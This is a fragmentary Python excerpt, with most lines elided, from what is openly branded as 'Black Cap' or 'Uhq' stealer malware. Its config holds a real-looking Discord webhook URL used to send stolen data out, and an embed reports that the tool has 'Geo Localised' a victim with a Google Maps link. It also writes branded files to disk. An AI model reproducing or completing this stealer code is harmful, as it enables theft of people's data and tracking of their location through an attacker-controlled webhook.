...
__config__ = {
    'yourwebhookurl': "https://discord.com/api/webhooks/1078177677363662848/eum9ah_y8sL84bh3-MrEPDKPBw8hCFSAOt3cDRBXJUjD88vCnTW4rnkSrCLmIQgbfmMw",
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("Black Cap Create By KS.H\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(x + "\n\nBlack Cap Create By KSCH")
            ...
            'embeds': [
                {
                    ...
                    'color': 374276,
                    'description': f'[Uhq - Stealer has Geo Localised this guy]({self.googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
